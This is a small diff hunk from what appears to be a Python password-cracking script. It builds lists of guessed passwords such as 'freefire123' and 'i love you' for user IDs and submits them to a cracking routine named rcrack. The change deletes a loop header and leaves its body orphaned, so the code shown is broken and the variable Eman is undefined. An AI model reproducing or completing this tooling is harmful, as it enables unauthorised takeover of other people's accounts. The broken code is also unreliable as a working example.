@@ -204,7 +204,7 @@ def xxr():
         for love in user:
               pwx = [uid,'free fire','freefire123','i love you']
             
-            for Eman in HamiiID:
+            
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
